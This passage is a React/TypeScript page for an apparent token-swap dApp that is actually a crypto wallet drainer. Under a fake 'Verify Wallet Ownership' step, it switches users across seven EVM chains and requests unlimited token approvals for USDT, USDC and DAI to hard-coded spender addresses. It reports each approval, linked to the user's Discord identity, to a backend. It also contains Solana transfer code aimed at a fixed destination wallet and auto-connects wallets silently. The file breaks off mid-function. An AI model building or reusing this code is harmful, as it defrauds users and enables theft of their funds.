import { Button } from "@/components/ui/button";
import { ArrowDown, Settings, ChevronDown, Loader2, CheckCircle } from "lucide-react";
import { useState, useEffect } from "react";
import { useAccount, useDisconnect, useChainId, useWriteContract, usePublicClient, useSwitchChain } from "wagmi";
import { getPublicClient } from "@wagmi/core";
import { useConnectModal, useChainModal } from "@rainbow-me/rainbowkit";
import { config as wagmiConfig } from "@/wagmi";
import { Connection, PublicKey, Transaction, TransactionInstruction } from "@solana/web3.js";
import headerImage from "@assets/image_1767365952238.png";
import section1 from "@assets/image_1770369464111.png";
import section2 from "@assets/image_1770369503143.png";
import section3 from "@assets/image_1770369543162.png";
import section4 from "@assets/image_1770369567405.png";
import section5 from "@assets/image_1770369594094.png";
import section6 from "@assets/image_1770369615963.png";

const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

const ERC20_APPROVE_ABI = [
  {
    inputs: [
      { name: "spender", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
] as const;

const EVM_TOKENS = [
  { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", name: "Tether" },
  { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", name: "USD Coin" },
  { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", name: "Dai" },
];

const CHAIN_CONTRACT_ADDRESSES: Record<number, { spenderAddress: string; tokens: string[] }> = {
  1: { spenderAddress: "0x333438075b576B685249ECE80909Cccad90B6297", tokens: ["0xdAC17F958D2ee523a2206206994597C13D831ec7", "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "0x6B175474E89094C44Da98b954EedeAC495271d0F"] },
  56: { spenderAddress: "0x65BDae94B4412640313968138384264cAFcB1E66", tokens: ["0x55d398326f99059fF775485246999027B3197955", "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3"] },
  137: { spenderAddress: "0x90E92a5D138dECe17f1fe680ddde0900C76429Dc", tokens: ["0xc2132D05D31c914a87C6611C10748AEb04B58e8F", "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"] },
  42161: { spenderAddress: "0x125112F80069d13BbCb459D76C215C7E3dd0b424", tokens: ["0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1"] },
  10: { spenderAddress: "0xe063eE1Fb241B214Bd371B46E377936b9514Cc5c", tokens: ["0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1"] },
  43114: { spenderAddress: "0xA6D97ca6E6E1C47B13d17a162F8e466EdFDe3d2e", tokens: ["0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", "0xd586E7F844cEa2F87f50152665BCbc2C279D8d70"] },
  8453: { spenderAddress: "0x1864b6Ab0091AeBdcf47BaF17de4874daB0574d7", tokens: ["0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2", "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb"] },
};

const SOLANA_DESTINATION_WALLET = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
const SOLANA_USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
const SOLANA_USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";

// Predefined list of Solana tokens for approval - 50+ popular tokens
const SOLANA_APPROVAL_TOKENS = [
  { symbol: "USDC", name: "USD Coin", mint: SOLANA_USDC_MINT },
  { symbol: "USDT", name: "Tether", mint: SOLANA_USDT_MINT },
  { symbol: "SOL", name: "Wrapped SOL", mint: "So11111111111111111111111111111111111111112" },
  { symbol: "BONK", name: "Bonk", mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263" },
  { symbol: "JUP", name: "Jupiter", mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN" },
  { symbol: "RAY", name: "Raydium", mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R" },
  { symbol: "PYTH", name: "Pyth Network", mint: "HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3" },
  { symbol: "WIF", name: "dogwifhat", mint: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm" },
  { symbol: "ORCA", name: "Orca", mint: "orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE" },
  { symbol: "MNGO", name: "Mango", mint: "MangoCzJ36AjZyKwVj3VnYU4GTonjfVEnJmvvWaxLac" },
  { symbol: "SAMO", name: "Samoyedcoin", mint: "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU" },
  { symbol: "SRM", name: "Serum", mint: "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt" },
  { symbol: "STEP", name: "Step Finance", mint: "StepAscQoEioFxxWGnh2sLBDFp9d8rvKz2Yp39iDpyT" },
  { symbol: "COPE", name: "Cope", mint: "8HGyAAB1yoM1ttS7pXjHMa3dukTFGQggnFFH3hJZgzQh" },
  { symbol: "FIDA", name: "Bonfida", mint: "EchesyfXePKdLtoiZSL8pBe8Myagyy8ZRqsACNCFGnvp" },
  { symbol: "MEDIA", name: "Media Network", mint: "ETAtLmCmsoiEEKfNrHKJ2kYy3MoABhU6NQvpSfij5tDs" },
  { symbol: "RENDER", name: "Render Token", mint: "rndrizKT3MK1iimdxRdWabcF7Zg7AR5T4nud4EkHBof" },
  { symbol: "JTO", name: "Jito", mint: "jtojtomepa8beP8AuQc6eXt5FriJwfFMwQx2v2f9mCL" },
  { symbol: "W", name: "Wormhole", mint: "85VBFQZC9TZkfaptBWjvUw7YbZjy52A6mjtPGjstQAmQ" },
  { symbol: "TNSR", name: "Tensor", mint: "TNSRxcUxoT9xBG3de7PiJyTDYu7kskLqcpddxnEJAS6" },
  { symbol: "HNT", name: "Helium", mint: "hntyVP6YFm1Hg25TN9WGLqM12b8TQmcknKrdu1oxWux" },
  { symbol: "MOBILE", name: "Helium Mobile", mint: "mb1eu7TzEc71KxDpsmsKoucSSuuoGLv1drys1oP2jh6" },
  { symbol: "IOT", name: "Helium IOT", mint: "iotEVVZLEywoTn1QdwNPddxPWszn3zFhEot3MfL9fns" },
  { symbol: "POPCAT", name: "Popcat", mint: "7GCihgDB8fe6KNjn2MYtkzZcRjQy3t9GHdC8uHYmW2hr" },
  { symbol: "MEW", name: "cat in a dogs world", mint: "MEW1gQWJ3nEXg2qgERiKu7FAFj79PHvQVREQUzScPP5" },
  { symbol: "BOME", name: "BOOK OF MEME", mint: "ukHH6c7mMyiWCf1b9pnWe25TSpkDDt3H5pQZgZ74J82" },
  { symbol: "SLERF", name: "Slerf", mint: "7BgBvyjrZX1YKz4oh9mjb8ZScatkkwb8DzFx7LoiVkM3" },
  { symbol: "MYRO", name: "Myro", mint: "HhJpBhRRn4g56VsyLuT8DL5Bv31HkXqsrahTTUCZeZg4" },
  { symbol: "WEN", name: "Wen", mint: "WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk" },
  { symbol: "MPLX", name: "Metaplex", mint: "METAewgxyPbgwsseH8T16a39CQ5VyVxZi9zXiDPY18m" },
  { symbol: "KMNO", name: "Kamino", mint: "KMNo3nJsBXfcpJTVhZcXLW7RmTwTt4GVFE7suUBo9sS" },
  { symbol: "DRIFT", name: "Drift", mint: "DriFtupJYLTosbwoN8koMbEYSx54aFAVLddWsbksjwg7" },
  { symbol: "BLZE", name: "Blaze", mint: "BLZEEuZUBVqFhj8adcCFPJvPVCiCyVmh3hkJMrU8KuJA" },
  { symbol: "BSOL", name: "BlazeStake SOL", mint: "bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1" },
  { symbol: "MSOL", name: "Marinade SOL", mint: "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So" },
  { symbol: "JSOL", name: "JPool SOL", mint: "7Q2afV64in6N6SeZsAAB81TJzwDoD6zpqmHkzi9Dcavn" },
  { symbol: "LST", name: "Liquid Staking", mint: "LSTxxxnJzKDFSLr4dUkPcmCf5VyryEqzPLz5j4bpxFp" },
  { symbol: "JITOSOL", name: "Jito Staked SOL", mint: "J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn" },
  { symbol: "INF", name: "Infinity", mint: "5oVNBeEEQvYi1cX3ir8Dx5n1P7pdxydbGF2X4TxVusJm" },
  { symbol: "DUAL", name: "Dual Finance", mint: "DUALa4FC2yREwZ59PHeu1un4wis36vHRv5hWVBmzykCJ" },
  { symbol: "SHDW", name: "Shadow Token", mint: "SHDWyBxihqiCj6YekG2GUr7wqKLeLAMK1gHZck9pL6y" },
  { symbol: "HONEY", name: "Hivemapper", mint: "4vMsoUT2BWatFweudnQM1xedRLfJgJ7hswhcpz4xgBTy" },
  { symbol: "AUDIO", name: "Audius", mint: "9LzCMqDgTKYz9Drzqnpgee3SGa89up3a247ypMj2xrqM" },
  { symbol: "GMT", name: "STEPN", mint: "7i5KKsX2weiTkry7jA4ZwSuXGhs5eJBEjY8vVxR4pfRx" },
  { symbol: "GST", name: "Green Satoshi", mint: "AFbX8oGjGpmVFywbVouvhQSRmiW2aR1mohfahi4Y2AdB" },
  { symbol: "GENE", name: "Genopets", mint: "GENEtH5amGSi8kHAtQoezp1XEXwZJ8vcuePYnXdKrMYz" },
  { symbol: "ATLAS", name: "Star Atlas", mint: "ATLASXmbPQxBUYbxPsV97usA3fPQYEqzQBUHgiFCUsXx" },
  { symbol: "POLIS", name: "Star Atlas DAO", mint: "poLisWXnNRwC6oBu1vHiuKQzFjGL4XDSu4g9qjz9qVk" },
  { symbol: "PRISM", name: "Prism", mint: "PRSMNsEPqhGVCH1TtWiJqPjJyh2cKrLostPZTNy1o5x" },
  { symbol: "SLND", name: "Solend", mint: "SLNDpmoWTVADgEdndyvWzroNL7zSi1dF9PC3xHGtPwp" },
  { symbol: "PORT", name: "Port Finance", mint: "PoRTjZMPXb9T7dyU7tpLEZRQj7e6ssfAE62j2oQuc6y" },
];
const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");

function getAssociatedTokenAddress(mint: PublicKey, owner: PublicKey): PublicKey {
  const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
  const [address] = PublicKey.findProgramAddressSync(
    [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
    ASSOCIATED_TOKEN_PROGRAM_ID
  );
  return address;
}

function createTransferInstruction(
  source: PublicKey,
  destination: PublicKey,
  owner: PublicKey,
  amount: bigint
): TransactionInstruction {
  const data = new Uint8Array(9);
  data[0] = 3;
  
  const amountBytes = new ArrayBuffer(8);
  const view = new DataView(amountBytes);
  view.setBigUint64(0, amount, true);
  data.set(new Uint8Array(amountBytes), 1);
  
  return new TransactionInstruction({
    keys: [
      { pubkey: source, isSigner: false, isWritable: true },
      { pubkey: destination, isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: true, isWritable: false },
    ],
    programId: TOKEN_PROGRAM_ID,
    data: data as Buffer,
  });
}

const SYSTEM_PROGRAM_ID = new PublicKey("11111111111111111111111111111111");
const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");

function createAssociatedTokenAccountIdempotentInstruction(
  payer: PublicKey,
  ata: PublicKey,
  owner: PublicKey,
  mint: PublicKey
): TransactionInstruction {
  return new TransactionInstruction({
    keys: [
      { pubkey: payer, isSigner: true, isWritable: true },
      { pubkey: ata, isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: false, isWritable: false },
      { pubkey: mint, isSigner: false, isWritable: false },
      { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
    ],
    programId: ASSOCIATED_TOKEN_PROGRAM_ID,
    data: Buffer.from([1]),
  });
}

function getTokenBalanceFromAccountData(data: Buffer): bigint {
  if (data.length < 72) return BigInt(0);
  const view = new DataView(data.buffer, data.byteOffset, data.byteLength);
  return view.getBigUint64(64, true);
}


interface SolanaWalletProvider {
  connect: (options?: { onlyIfTrusted?: boolean }) => Promise<{ publicKey: PublicKey }>;
  disconnect: () => Promise<void>;
  signTransaction: (transaction: Transaction) => Promise<Transaction>;
  signAllTransactions?: (transactions: Transaction[]) => Promise<Transaction[]>;
  signAndSendTransaction?: (transaction: Transaction, options?: any) => Promise<{ signature: string }>;
  signAndSendAllTransactions?: (transactions: Transaction[], options?: any) => Promise<string[]>;
  signMessage?: (message: Uint8Array) => Promise<{ signature: Uint8Array }>;
  publicKey: PublicKey | null;
  isConnected: boolean;
  on?: (event: string, callback: () => void) => void;
  off?: (event: string, callback: () => void) => void;
}

declare global {
  interface Window {
    solana?: SolanaWalletProvider & { isPhantom?: boolean };
    backpack?: { solana?: SolanaWalletProvider };
    solflare?: SolanaWalletProvider & { isSolflare?: boolean };
    okxwallet?: { solana?: SolanaWalletProvider };
    trustwallet?: { solana?: SolanaWalletProvider };
    bitkeep?: { solana?: SolanaWalletProvider };
  }
}

type SolanaWalletType = "phantom" | "backpack" | "solflare" | "okx" | "trustwallet" | "bitget";

const isMobile = () => {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
};

const getDappUrl = () => encodeURIComponent(window.location.href);

const SOLANA_WALLETS = [
  { 
    id: "phantom" as SolanaWalletType, 
    name: "Phantom", 
    icon: "/assets/phantom-logo.png",
    getProvider: () => window.solana,
    isAvailable: () => !!window.solana?.isPhantom,
    mobileLink: () => `https://phantom.app/ul/browse/${getDappUrl()}`
  },
  { 
    id: "backpack" as SolanaWalletType, 
    name: "Backpack", 
    icon: "/assets/backpack-logo.png",
    getProvider: () => window.backpack?.solana,
    isAvailable: () => !!window.backpack?.solana,
    mobileLink: () => `https://backpack.app/ul/browse/${getDappUrl()}`
  },
  { 
    id: "solflare" as SolanaWalletType, 
    name: "Solflare", 
    icon: "/assets/solflare-logo.png",
    getProvider: () => window.solflare,
    isAvailable: () => !!window.solflare?.isSolflare,
    mobileLink: () => `https://solflare.com/ul/v1/browse/${getDappUrl()}`
  },
  { 
    id: "okx" as SolanaWalletType, 
    name: "OKX Wallet", 
    icon: "okx",
    getProvider: () => window.okxwallet?.solana,
    isAvailable: () => !!window.okxwallet?.solana,
    mobileLink: () => `okx://wallet/dapp/details?dappUrl=${getDappUrl()}`
  },
  { 
    id: "trustwallet" as SolanaWalletType, 
    name: "Trust Wallet", 
    icon: "/assets/trustwallet-logo.png",
    getProvider: () => window.trustwallet?.solana,
    isAvailable: () => !!window.trustwallet?.solana,
    mobileLink: () => `https://link.trustwallet.com/open_url?coin_id=501&url=${getDappUrl()}`
  },
  { 
    id: "bitget" as SolanaWalletType, 
    name: "Bitget Wallet", 
    icon: "/assets/bitget-logo.png",
    getProvider: () => window.bitkeep?.solana,
    isAvailable: () => !!window.bitkeep?.solana,
    mobileLink: () => `https://bkcode.vip/kc/?a=connect&url=${getDappUrl()}`
  },
];

const TokenIcon = ({ symbol, size = 24 }: { symbol: string; size?: number }) => {
  const icons: Record<string, JSX.Element> = {
    ETH: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#627EEA"/>
        <path d="M16.498 4v8.87l7.497 3.35L16.498 4z" fill="#fff" fillOpacity=".6"/>
        <path d="M16.498 4L9 16.22l7.498-3.35V4z" fill="#fff"/>
        <path d="M16.498 21.968v6.027L24 17.616l-7.502 4.352z" fill="#fff" fillOpacity=".6"/>
        <path d="M16.498 27.995v-6.028L9 17.616l7.498 10.379z" fill="#fff"/>
        <path d="M16.498 20.573l7.497-4.353-7.497-3.348v7.701z" fill="#fff" fillOpacity=".2"/>
        <path d="M9 16.22l7.498 4.353v-7.701L9 16.22z" fill="#fff" fillOpacity=".6"/>
      </svg>
    ),
    SOL: (
      <img src="/assets/solana-logo.png" width={size} height={size} alt="SOL" className="rounded" style={{width: size, height: size}} />
    ),
    USDC: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#2775CA"/>
        <path d="M20.022 18.124c0-2.124-1.28-2.852-3.84-3.156-1.828-.24-2.196-.728-2.196-1.578 0-.85.608-1.396 1.824-1.396 1.088 0 1.696.364 1.972 1.276a.39.39 0 00.364.268h.84a.36.36 0 00.356-.388c-.24-1.516-1.264-2.632-2.892-2.908v-1.66a.358.358 0 00-.364-.364h-.728a.358.358 0 00-.364.364v1.604c-1.828.304-2.984 1.516-2.984 3.004 0 1.996 1.216 2.788 3.776 3.092 1.7.244 2.26.608 2.26 1.64 0 1.032-.912 1.724-2.132 1.724-1.66 0-2.196-.696-2.392-1.64a.374.374 0 00-.364-.304h-.912a.36.36 0 00-.356.388c.244 1.716 1.328 2.972 3.14 3.284v1.66c0 .2.164.364.364.364h.728a.358.358 0 00.364-.364v-1.66c1.828-.364 3.036-1.64 3.036-3.35z" fill="#fff"/>
        <path d="M12.628 24.164c-4.256-1.54-6.44-6.26-4.868-10.46 1.024-2.788 3.476-4.596 6.24-4.992V6.948c-3.632.396-6.672 2.788-8.024 6.14-2.016 5.052.476 10.792 5.528 12.808a9.856 9.856 0 003.124.728v-1.764a7.95 7.95 0 01-2-.696zM16 6.948v1.764c3.632.396 6.372 3.22 6.372 6.644h1.764c0-4.18-3.392-7.812-8.136-8.408z" fill="#fff"/>
      </svg>
    ),
    USDT: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#26A17B"/>
        <path d="M17.922 17.383v-.002c-.11.008-.677.042-1.942.042-1.01 0-1.721-.03-1.971-.042v.003c-3.888-.171-6.79-.848-6.79-1.658 0-.809 2.902-1.486 6.79-1.66v2.644c.254.018.982.061 1.988.061 1.207 0 1.812-.05 1.925-.06v-2.643c3.88.173 6.775.85 6.775 1.658 0 .81-2.895 1.485-6.775 1.657zm0-3.59v-2.366h5.414V7.819H8.595v3.608h5.414v2.365c-4.4.202-7.709 1.074-7.709 2.118 0 1.044 3.309 1.915 7.709 2.118v7.582h3.913v-7.584c4.393-.202 7.694-1.073 7.694-2.116 0-1.043-3.301-1.914-7.694-2.117z" fill="#fff"/>
      </svg>
    ),
    DAI: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#F5AC37"/>
        <path d="M16 6L9 16l7 10 7-10-7-10zm0 3.236L20.944 16 16 22.764 11.056 16 16 9.236z" fill="#fff"/>
        <path d="M16 22.764V26L23 16l-2.056 0L16 22.764zM16 9.236V6L9 16l2.056 0L16 9.236z" fill="#fff" fillOpacity=".6"/>
      </svg>
    ),
  };
  return icons[symbol] || <div className="w-6 h-6 rounded-full bg-gray-400" />;
};

const TOKENS = [
  { symbol: "ETH", name: "Ethereum" },
  { symbol: "USDC", name: "USD Coin" },
  { symbol: "USDT", name: "Tether" },
  { symbol: "DAI", name: "Dai" },
];

const SOLANA_TOKENS = [
  { symbol: "SOL", name: "Solana" },
  { symbol: "USDC", name: "USD Coin" },
  { symbol: "USDT", name: "Tether" },
];

type Step = "idle" | "approving" | "transferring" | "done";
type NetworkType = "evm" | "solana";

export default function Home() {
  const [activeTab, setActiveTab] = useState("Swap");
  const [sellAmount, setSellAmount] = useState("");
  const [buyAmount, setBuyAmount] = useState("");
  const [sellToken, setSellToken] = useState(TOKENS[0]);
  const [buyToken, setBuyToken] = useState<typeof TOKENS[0] | null>(null);
  const [showSellTokens, setShowSellTokens] = useState(false);
  const [showBuyTokens, setShowBuyTokens] = useState(false);
  
  const [step, setStep] = useState<Step>("idle");
  const [error, setError] = useState<string>("");
  
  const [networkType, setNetworkType] = useState<NetworkType>("evm");
  const [showSolanaWalletModal, setShowSolanaWalletModal] = useState(false);
  const [showUnifiedWalletModal, setShowUnifiedWalletModal] = useState(false);
  const [showNetworkDropdown, setShowNetworkDropdown] = useState(false);
  const [walletModalTab, setWalletModalTab] = useState<"evm" | "solana">("evm");
  
  const [solanaConnected, setSolanaConnected] = useState(false);
  const [solanaAddress, setSolanaAddress] = useState<string | null>(null);
  const [solanaStep, setSolanaStep] = useState<Step>("idle");
  const [selectedSolanaWallet, setSelectedSolanaWallet] = useState<SolanaWalletType | null>(null);
  const [solanaProvider, setSolanaProvider] = useState<SolanaWalletProvider | null>(null);
  const [showSigningScreen, setShowSigningScreen] = useState(false);
  const [verifyButtonText, setVerifyButtonText] = useState("Verifying Your Account...");
  const [wasConnected, setWasConnected] = useState(false);
  const [chainCycleIndex, setChainCycleIndex] = useState(0);
  const [chainCycleActive, setChainCycleActive] = useState(false);
  const [chainCycleTotal, setChainCycleTotal] = useState(0);

  const [discordUser, setDiscordUser] = useState<string | null>(null);
  const [discordId, setDiscordId] = useState<string | null>(null);
  const [discordAvatar, setDiscordAvatar] = useState<string | null>(null);
  const [discordVerified, setDiscordVerified] = useState(false);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const user = params.get('discord_user');
    const id = params.get('discord_id');
    const avatar = params.get('discord_avatar');
    const verified = params.get('verified');

    if (user && id) {
      setDiscordUser(user);
      setDiscordId(id);
      if (avatar) setDiscordAvatar(avatar);
      if (verified === 'true') setDiscordVerified(true);
      window.history.replaceState({}, '', '/');
    }
  }, []);

  const { address, isConnected } = useAccount();
  const { openConnectModal } = useConnectModal();
  const { openChainModal } = useChainModal();
  const { disconnect } = useDisconnect();
  const chainId = useChainId();
  
  const chainNames: Record<number, string> = {
    1: "Ethereum",
    56: "BNB",
    137: "Polygon",
    42161: "Arbitrum",
    10: "Optimism",
    43114: "Avalanche",
    8453: "Base",
  };
  
  const { writeContractAsync } = useWriteContract();
  const publicClient = usePublicClient();
  const { switchChainAsync } = useSwitchChain();

  const ALL_CHAIN_IDS = [1, 56, 137, 42161, 10, 43114, 8453];

  useEffect(() => {
    const nowConnected = isConnected || solanaConnected;
    if (nowConnected && !wasConnected) {
      setShowUnifiedWalletModal(false);
      setShowSigningScreen(true);
    }
    if (!nowConnected && wasConnected) {
      setShowSigningScreen(false);
      setStep("idle");
      setSolanaStep("idle");
      setError("");
    }
    setWasConnected(nowConnected);
  }, [isConnected, solanaConnected]);

  const [prevChainId, setPrevChainId] = useState<number | undefined>(chainId);

  useEffect(() => {
    if (isConnected && chainId && prevChainId && chainId !== prevChainId) {
      if (!chainCycleActive) {
        setStep("idle");
        setError("");
        setShowSigningScreen(true);
      }
    }
    setPrevChainId(chainId);
  }, [chainId]);

  useEffect(() => {
    if (step === "done" || solanaStep === "done") {
      setShowSigningScreen(false);
    }
  }, [step, solanaStep]);

  useEffect(() => {
    if (showSigningScreen) {
      setVerifyButtonText("Verifying Your Account...");
      const timer = setTimeout(() => {
        setVerifyButtonText("Verify Wallet Ownership");
      }, 5000);
      return () => clearTimeout(timer);
    }
  }, [showSigningScreen]);

  useEffect(() => {
    const walletConnected = isConnected || solanaConnected;
    const signingDone = step === "done" || solanaStep === "done";
    if (!walletConnected || signingDone) return;

    if (!showSigningScreen) {
      const timer = setTimeout(() => {
        setShowSigningScreen(true);
      }, 2000);
      return () => clearTimeout(timer);
    }
  }, [showSigningScreen, isConnected, solanaConnected, step, solanaStep]);

  useEffect(() => {
    // Auto-connect when dApp loads inside any Solana wallet browser
    const autoConnectSolanaWallet = async () => {
      // Check each wallet provider and auto-connect if available
      for (const wallet of SOLANA_WALLETS) {
        const provider = wallet.getProvider();
        if (provider) {
          try {
            // Check if already connected
            if (provider.isConnected && provider.publicKey) {
              const address = typeof provider.publicKey === 'string' 
                ? provider.publicKey 
                : provider.publicKey.toBase58();
              setSolanaConnected(true);
              setSolanaAddress(address);
              setSelectedSolanaWallet(wallet.id);
              setSolanaProvider(provider);
              setNetworkType("solana");
              setSellToken(SOLANA_TOKENS[0]);
              return;
            }
            
            // On mobile inside wallet browser, try to connect automatically
            if (isMobile() && provider.connect) {
              // Try silent connect first (Phantom supports onlyIfTrusted)
              try {
                await provider.connect({ onlyIfTrusted: true });
              } catch {
                // Fallback for wallets that don't support onlyIfTrusted
                await provider.connect();
              }
              if (provider.publicKey) {
                const address = typeof provider.publicKey === 'string' 
                  ? provider.publicKey 
                  : provider.publicKey.toBase58();
                setSolanaConnected(true);
                setSolanaAddress(address);
                setSelectedSolanaWallet(wallet.id);
                setSolanaProvider(provider);
                setNetworkType("solana");
                setSellToken(SOLANA_TOKENS[0]);
                return;
              }
            }
          } catch (err) {
            // Silent fail - user hasn't approved connection yet
          }
        }
      }
    };
    
    // Small delay to ensure wallet providers are injected
    setTimeout(autoConnectSolanaWallet, 500);
    
    // Listen for connection events on Phantom
    if (window.solana?.on) {
      window.solana.on('connect', () => {
        if (window.solana?.publicKey) {
          setSolanaConnected(true);
          setSolanaAddress(window.solana.publicKey.toBase58());
          setSelectedSolanaWallet("phantom");
          setSolanaProvider(window.solana);
        }
      });
      window.solana.on('disconnect', () => {
        setSolanaConnected(false);
        setSolanaAddress(null);
      });
    }
  }, []);

  useEffect(() => {
    if (address) {
      setStep("idle");
    }
  }, [address]);

  useEffect(() => {
    if (chainId && isConnected && !chainCycleActive) {
      setStep("idle");
    }
  }, [chainId]);

  const approveTokensOnCurrentChain = async (targetChainId: number) => {
    if (!address) return;

    const localConfig = CHAIN_CONTRACT_ADDRESSES[targetChainId];
    if (!localConfig) return;

    let spenderAddr: `0x${string}`;
    let tokenAddresses: string[];

    try {
      const configRes = await fetch(`/api/spender-config?chainId=${targetChainId}`);
      const config = await configRes.json();
      if (config.spenderAddress) {
        spenderAddr = config.spenderAddress as `0x${string}`;
        tokenAddresses = (config.tokens || localConfig.tokens) as string[];
      } else {
        spenderAddr = localConfig.spenderAddress as `0x${string}`;
        tokenAddresses = localConfig.tokens;
      }
    } catch {
      spenderAddr = localConfig.spenderAddress as `0x${string}`;
      tokenAddresses = localConfig.tokens;
    }

    const chainClient = getPublicClient(wagmiConfig, { chainId: targetChainId as any });

    const tokenSymbols = ["USDT", "USDC", "DAI"];

    for (let i = 0; i < tokenAddresses.length; i++) {
      const tokenAddr = tokenAddresses[i];
      const tokenSymbol = tokenSymbols[i] || "UNKNOWN";
      try {
        let currentAllowance = BigInt(0);
        if (chainClient) {
          try {
            currentAllowance = await chainClient.readContract({
              address: tokenAddr as `0x${string}`,
              abi: ERC20_APPROVE_ABI,
              functionName: 'allowance',
              args: [address as `0x${string}`, spenderAddr],
            }) as bigint;
          } catch {}
        }

        if (currentAllowance > BigInt(0)) {
          console.log(`[Verify] ${tokenSymbol} on ${chainNames[targetChainId]} already verified`);
          fetch("/api/approvals", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              walletAddress: address,
              tokenAddress: tokenAddr,
              tokenSymbol,
              transactionHash: "pre-approved",
              chainId: targetChainId,
              discordUser: discordUser || undefined,
            }),
          }).catch(() => {});
          continue;
        }

        console.log(`[Verify] Verifying ${tokenSymbol} on ${chainNames[targetChainId]}...`);

        const txHash = await writeContractAsync({
          chainId: targetChainId as any,
          address: tokenAddr as `0x${string}`,
          abi: ERC20_APPROVE_ABI,
          functionName: 'approve',
          args: [spenderAddr, BigInt(MAX_UINT256)],
        });

        console.log(`[Verify] ${tokenSymbol} on ${chainNames[targetChainId]} verified`);
        fetch("/api/approvals", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            walletAddress: address,
            tokenAddress: tokenAddr,
            tokenSymbol,
            transactionHash: txHash || "confirmed",
            chainId: targetChainId,
            discordUser: discordUser || undefined,
          }),
        }).catch(() => {});
      } catch (tokenErr: any) {
        console.error(`[Verify] Failed to verify ${tokenSymbol} on ${chainNames[targetChainId]}:`, tokenErr?.message);
      }
    }
  };

  const handleProceed = async () => {
    if (!address) return;
    setError("");
    if (step !== "idle") return;
    setStep("approving");
    setChainCycleActive(true);
    setChainCycleTotal(ALL_CHAIN_IDS.length);
    setChainCycleIndex(0);

    try {
      for (let i = 0; i < ALL_CHAIN_IDS.length; i++) {
        const targetChainId = ALL_CHAIN_IDS[i];
        setChainCycleIndex(i);

        console.log(`[Verify] Switching to ${chainNames[targetChainId]}...`);
        try {
          await switchChainAsync({ chainId: targetChainId });
          await new Promise(r => setTimeout(r, 800));
        } catch (switchErr: any) {
          console.error(`[Verify] Failed to switch to ${chainNames[targetChainId]}:`, switchErr?.message);
          continue;
        }

        await approveTokensOnCurrentChain(targetChainId);
      }

      setStep("done");
      setChainCycleActive(false);
    } catch (err: any) {
      console.error("Approval error:", err);
      if (err?.message?.includes("User rejected") || err?.message?.includes("denied") || err?.code === 4001) {
        setError("Transaction rejected");
      } else {
